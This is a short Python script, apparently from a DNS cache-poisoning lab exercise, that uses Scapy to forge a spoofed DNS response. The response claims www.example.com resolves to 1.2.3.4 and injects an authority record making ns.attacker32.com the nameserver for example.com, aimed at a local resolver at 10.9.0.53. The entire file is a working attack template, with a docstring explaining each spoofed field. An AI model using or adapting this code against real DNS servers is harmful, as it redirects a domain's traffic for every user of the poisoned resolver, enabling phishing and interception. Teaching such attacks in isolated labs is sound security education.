#!/usr/bin/env python3
from scapy.all import *


"""name - this should be the name that is queried, which is www.example.com.
   domain - this should be the domain name, which is example.com.
   ns - this should be the nameserver which has provided the answer to the query, which we want to be the malicious nameserver ns.attacker32.com.
   IP dst - this should be the IP address of the local DNS server, which is '10.9.0.53'.
   IP src - this should be the IP address of the attacker, which is '10.9.0.1'.
   UDP dport - this should be the destination port of the packet, any UDP port should do, so 53 was chosen.
   UDP sport - this should be the source port of the packet, any UDP port should do, so 52055 was chosen."""

name = "www.example.com"
domain = "example.com"
ns = "ns.attacker32.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)

ip = IP(dst='10.9.0.53', src='10.9.0.1')
udp = UDP(dport=53, sport=52055, chksum=0)
reply = ip/udp/dns

send(reply)      
